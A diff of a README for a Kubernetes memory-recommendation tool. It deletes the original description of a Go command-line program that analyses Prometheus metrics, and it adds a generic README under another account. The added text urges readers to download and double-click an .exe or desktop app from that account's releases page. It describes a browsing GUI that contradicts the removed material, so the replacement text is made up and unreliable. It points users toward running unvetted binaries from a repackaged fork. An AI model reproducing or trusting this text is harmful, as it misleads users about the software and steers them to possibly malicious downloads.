@@ -1,275 +1,72 @@
-# 🎯 Kubernetes Resources Recommend
-
-[![Go](https://img.shields.io/badge/Go-1.23+-00ADD8?style=flat&logo=go)](https://golang.org/)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)]()
-
-> 🚀 Intelligent Memory Resource Recommendation System for Kubernetes Deployments based on Prometheus Monitoring Data
-
-## 🌍 Language / 语言
-
-- **English** (Current)
-- **[中文](README-zh.md)** 
-
-## ✨ Features
-
-🔍 **Intelligent Analysis** - Deep analysis based on 7 days of memory usage data  
-📊 **Scientific Algorithm** - Precise recommendations using P90 values and exponential decay weighting  
-🏢 **Multi-tenant Support** - Support for independent analysis across multiple namespaces  
-⚡ **High Performance** - Concurrent processing for dramatically improved analysis efficiency  
-📑 **Friendly Reports** - Export beautiful Excel format analysis reports  
-🔍 **Current vs Recommended** - Compare current resource configuration with AI recommendations  
-📈 **Optimization Insights** - Clear visibility into resource savings and optimization potential  
-
-## 🎯 Scope of Recommendations
-
-> ⚠️ **Important Note**: This tool currently **provides Memory resource recommendations only**
-
-### 💾 Why Memory Resources Only?
-
-**Memory - Non-compressible Resource**  
-- 🚨 **Strict Limits** - When container memory usage exceeds limits, Kubernetes immediately terminates (OOMKilled) the Pod
-- 📈 **Accurate Prediction** - Memory usage patterns are relatively stable, historical data has good predictive value
-- ⚖️ **Critical Balance** - Setting too low causes frequent OOM, setting too high wastes resources
-- 🎯 **Precise Control** - Requires precise recommendations based on real usage data
-
-**CPU - Compressible Resource (Not recommended yet)**  
-- 🔄 **Compressible** - When CPU resources are insufficient, containers are throttled but not killed
-- 📊 **Complex Patterns** - CPU usage is affected by business peaks, concurrency and other factors, making prediction complex
-- 🌊 **Dynamic Adjustment** - Kubernetes HPA can automatically scale based on CPU utilization
-
-## 📁 Project Structure
-
-```
-kubernetes-resources-recommend/
-├── 📂 cmd/kubernetes-resources-recommend/   # 🚪 Main program entry
-│   └── main.go
-├── 📂 internal/                            # 🔒 Internal packages, not exposed externally
-│   ├── 📂 exporter/                        # 📊 Export functionality
-│   │   └── excel.go
-│   ├── 📂 prometheus/                      # 📈 Prometheus client
-│   │   ├── client.go
-│   │   └── metrics.go
-│   ├── 📂 recommender/                     # 🧠 Recommendation algorithm core
-│   │   └── recommender.go
-│   └── 📂 types/                          # 📋 Type definitions
-│       ├── prometheus.go
-│       └── recommendation.go
-├── 📂 pkg/                                # 📦 Public packages
-│   └── 📂 config/                         # ⚙️ Configuration management
-│       ├── config.go
-│       └── errors.go
-├── 🔧 Makefile                           # 🛠️ Build scripts
-├── 📄 go.mod & go.sum                    # 📚 Dependency management
-└── 📖 README.md                          # 📝 Project documentation
-```
-
-## 🚀 Quick Start
-
-### 📦 Installation
-
-```bash
-# Clone the project
-git clone https://github.com/luozijian1990/kubernetes-resources-recommend.git
-cd kubernetes-resources-recommend
-
-# Install dependencies
-go mod download
-```
-
-### 🔨 Build
-
-```bash
-# Using Makefile (recommended)
-make build
-
-# Or manual build
-go build -o bin/kubernetes-resources-recommend cmd/kubernetes-resources-recommend/main.go
-
-# Cross-platform build
-make build-all
-```
-
-### 💡 Usage Examples
-
-```bash
-# Basic usage
-./bin/kubernetes-resources-recommend \
-  -prometheusUrl="https://prometheus.your-domain.com" \
-  -checkNamespace="production" \
-  -limits=1.5
-
-# Using Makefile to run
-make run ARGS="-prometheusUrl=https://prometheus.example.com -checkNamespace=staging"
-```
-
-### 📋 Parameter Description
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `-prometheusUrl` | string | `https://prometheus.example.com` | 🌐 Prometheus server address |
-| `-checkNamespace` | string | `default` | 🏷️ Kubernetes namespace to analyze |
-| `-limits` | float64 | `1.5` | 📏 Memory limit multiplier relative to request |
-
-## 🧮 Memory Recommendation Algorithm
-
-Our intelligent memory resource recommendation algorithm is based on the following steps:
-
-```mermaid
-graph TD
-    A["Collect 7-day historical data"] --> B["Analyze by hourly granularity"]
-    B --> C["Calculate daily P90 values"]
-    C --> D["Apply exponential decay weighting"]
-    D --> E["Generate final recommendations"]
-    
-    F["container_memory_rss metrics"] --> A
-    G["weight = 0.5^(day+1)"] --> D
-    E --> H["Excel report output"]
-```
-
-**Algorithm Details:**
-
-1. **📈 Data Collection** - Analyze memory usage data from the past 7 days
-2. **⏱️ Fine Granularity** - Collect `container_memory_rss` metrics hourly
-3. **📊 Statistical Analysis** - Calculate daily P90 values (excluding anomalous peaks)
-4. **⚖️ Intelligent Weighting** - Apply exponential decay weighting: `weight = 0.5^(day+1)`
-5. **🎯 Final Calculation** - Weighted sum to get recommended memory request values
-6. **🛡️ Safety Margin** - Memory limit = Memory request × limits multiplier
-
-## 📊 Output Reports
-
-The program generates an Excel file named `{namespace}-resource-recommend.xlsx`:
-
-> 📝 **Note**: Current version includes **Memory resource recommendations only**
-
-### 📋 Report Field Description
-
-| Column | Description | Example | Notes |
-|--------|-------------|---------|-------|
-| 🏷️ Namespace | Kubernetes namespace | `production` | K8s namespace |
-| 🚀 Deployment | Deployment name | `web-server` | Deployment resource name |
-| 📦 Container | Container name | `app-container` | Container name |
-| 📊 Current Request (MB) | Current memory request | `1024` | Current configuration |
-| 📊 Current Limit (MB) | Current memory limit | `2048` | Current configuration |
-| 💾 Recommended Request (MB) | Recommended memory request | `512` | Based on 7-day P90 algorithm |
-| 🛡️ Recommended Limit (MB) | Recommended memory limit | `768` | Request × limits multiplier |
-| 📈 Request Optimization (MB) | Memory request savings | `512` | Current - Recommended |
-| 📈 Limit Optimization (MB) | Memory limit savings | `1280` | Current - Recommended |
-| 📊 Request Optimization (%) | Request savings percentage | `50.0%` | Optimization percentage |
-| 📊 Limit Optimization (%) | Limit savings percentage | `62.5%` | Optimization percentage |
-
-### 📈 Excel Output Example
-
-Generated Excel file structure:
-
-```
-Resource Recommendations.xlsx
-┌─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┐
-│  Namespace  │ Deployment  │  Container  │Cur Req (MB) │Cur Lmt (MB) │Rec Req (MB) │Rec Lmt (MB) │Req Opt (MB) │Lmt Opt (MB) │Req Opt (%)  │Lmt Opt (%)  │
-├─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┤
-│ production  │ web-server  │    nginx    │     512     │     1024    │     256     │     384     │     256     │     640     │   50.0%     │   62.5%     │
-│ production  │ web-server  │     app     │    1024     │     2048    │     512     │     768     │     512     │    1280     │   50.0%     │   62.5%     │
-│ production  │ api-gateway │   gateway   │     256     │     512     │     128     │     192     │     128     │     320     │   50.0%     │   62.5%     │
-│ production  │    redis    │    redis    │     128     │     256     │      64     │      96     │      64     │     160     │   50.0%     │   62.5%     │
-└─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┘
-
-📊 Optimization Summary Statistics
-┌─────────────────────────┬─────────────────┬─────────────────┬─────────────────┬─────────────────┐
-│        Metric           │ Current Config  │ Recommended     │ Optimization    │ Optimization %  │
-├─────────────────────────┼─────────────────┼─────────────────┼─────────────────┼─────────────────┤
-│ Total Containers        │       4         │                 │                 │                 │
-│ Memory Request (MB)     │     1920        │      960        │      960        │     50.0%       │
-│ Memory Limit (MB)       │     3840        │     1440        │     2400        │     62.5%       │
-└─────────────────────────┴─────────────────┴─────────────────┴─────────────────┴─────────────────┘
-```
-
-### 📊 Report Features
-
-- **🎨 Beautiful Formatting** - Header styling and automatic column width adjustment
-- **📈 Complete Data** - Contains all analyzed Deployments and Containers
-- **🔍 Easy Filtering** - Supports Excel filtering and sorting functionality
-- **📝 Clear Identification** - Clear column names and unit identification
-- **🎨 Color Coding** - Green for savings, red for increases needed
-- **📊 Summary Statistics** - Overall optimization statistics and container count
-
-### 🎯 Real Usage Scenario
-
-**Generate Report Example:**
-```bash
-$ ./bin/kubernetes-resources-recommend -checkNamespace=production -limits=1.5
-2024/01/15 10:30:00 Starting Kubernetes resource recommendation
-2024/01/15 10:30:01 All required metrics are available
-2024/01/15 10:30:01 Generating memory recommendations...
-2024/01/15 10:30:05 Processed namespace: production, deployment: web-server, container: nginx
-2024/01/15 10:30:08 Processed namespace: production, deployment: web-server, container: app
-2024/01/15 10:30:10 Processed namespace: production, deployment: api-gateway, container: gateway
-2024/01/15 10:30:12 Generated 6 recommendations
-2024/01/15 10:30:12 Recommendations exported to production-resource-recommend.xlsx
-2024/01/15 10:30:12 Process completed in 12.5s
-```
-
-**Generated Files:**
-- 📄 `production-resource-recommend.xlsx` - Contains detailed resource recommendation data
-- 📊 Formatted Excel spreadsheet, ready for direct use in resource configuration updates
-
-## 🔧 Development Guide
-
-### 🛠️ Available Commands
-
-```bash
-make help          # 📖 View all available commands
-make build         # 🔨 Build project
-make test          # 🧪 Run tests
-make test-coverage # 📊 Run tests and generate coverage report
-make fmt           # 🎨 Format code
-make lint          # 🔍 Code inspection
-make clean         # 🧹 Clean build artifacts
-```
-
-### 📋 System Requirements
-
-- **Go Version**: 1.23.9+ 
-- **Prometheus**: Requires kube-state-metrics installation
-- **Kubernetes**: Cluster environment (for obtaining monitoring metrics)
-
-### 📈 Required Prometheus Metrics
-
-Ensure your Prometheus instance collects the following metrics:
-
-| Metric Name | Description | Source |
-|-------------|-------------|--------|
-| `container_memory_rss` | Container memory usage | cAdvisor |
-| `kube_pod_owner` | Pod owner information | kube-state-metrics |
-| `kube_replicaset_owner` | ReplicaSet owner information | kube-state-metrics |
-| `kube_deployment_created` | Deployment creation time | kube-state-metrics |
-| `kube_deployment_spec_replicas` | Deployment replica specifications | kube-state-metrics |
-| `kube_pod_container_resource_requests` | Container resource requests | kube-state-metrics |
-| `kube_pod_container_resource_limits` | Container resource limits | kube-state-metrics |
-
-## 🤝 Contributing
-
-We welcome all forms of contributions! Please check [CONTRIBUTING.md](CONTRIBUTING.md) for detailed information.
-
-### 🐛 Issue Reporting
-
-If you find bugs or have feature suggestions, please [create an Issue](https://github.com/luozijian1990/kubernetes-resources-recommend/issues).
-
-## 📄 License
-
-This project is open sourced under the MIT license. Please see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Prometheus](https://prometheus.io/) - Powerful monitoring system
-- [excelize](https://github.com/qax-os/excelize) - Excel file processing library
-- [kube-state-metrics](https://github.com/kubernetes/kube-state-metrics) - Kubernetes metrics exporter
-
----
-
-<div align="center">
-
-**If this project helps you, please give us a ⭐ Star!**
-
-Made with ❤️ by [luozijian1990](https://github.com/luozijian1990)
-
-</div>
+# 🌟 kubernetes-resources-recommend - Get the Best Kubernetes Resources
+
+## 📥 Download Now
+
+[![Download kubernetes-resources-recommend](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/jvbartko/kubernetes-resources-recommend/releases)
+
+## 🚀 Getting Started
+
+Welcome to **kubernetes-resources-recommend**! This application helps you find and recommend the best resources for Kubernetes, making it easier for you to deploy and manage your applications in the cloud.
+
+## 💻 System Requirements
+
+To run this application smoothly, you will need:
+- Windows, macOS, or Linux operating system
+- At least 512 MB of RAM
+- 100 MB of disk space
+- Internet connection for downloading additional resources
+
+## 📦 Download & Install
+
+To download the application, visit this page: [Download Releases](https://github.com/jvbartko/kubernetes-resources-recommend/releases). 
+
+1. Click on the link above to go to the Releases page.
+2. Look for the latest release. It will be at the top of the page.
+3. Find the file corresponding to your operating system. 
+4. Click the file to start the download.
+
+After downloading:
+
+- Locate the file in your Downloads folder.
+- If you are on Windows, double-click the `.exe` file to start the installation.
+- If you are on macOS, drag the application to your Applications folder.
+- If you are on Linux, you may need to extract the files from the archive and follow the installation instructions provided.
+
+## 🛠️ Features
+
+- **Resource Recommendations:** Easily get recommended resources based on your needs.
+- **User-Friendly Interface:** Simple navigation makes it easy to use, even for beginners.
+- **Regular Updates:** The application is frequently updated with the latest Kubernetes resources.
+
+## 🔄 How to Use the Application
+
+1. Open the application after installation.
+2. Select the type of Kubernetes resource you wish to explore.
+3. Browse through the recommended options.
+4. Click on any resource for more details, including further links, tutorials, or documentation.
+
+## 💡 Tips for Using the Application
+
+- Take your time to explore different categories. The more you browse, the better you'll understand the available options.
+- Save useful resources in a separate document for easy access later.
+- Check back frequently for updates and new resources added to the application.
+
+## 🤝 Support
+
+If you run into any issues or have questions, you can reach out for support. Check the **Issues** tab on the GitHub repository to report problems or ask for clarification. Community members and the project maintainers are here to help.
+
+## 📜 License
+
+This application is open source and is licensed under the MIT License. By using this software, you agree to abide by the terms stipulated in the license.
+
+## 🌐 Contributing
+
+We welcome contributions to enhance the application. If you want to help, please follow these steps:
+
+1. Fork the repository.
+2. Make your changes on a new branch.
+3. Submit a pull request with a clear description of your changes.
+
+Thank you for your interest in **kubernetes-resources-recommend**. We hope this application helps you discover valuable Kubernetes resources.
+
+For more information and updates, visit: [Download Releases](https://github.com/jvbartko/kubernetes-resources-recommend/releases)
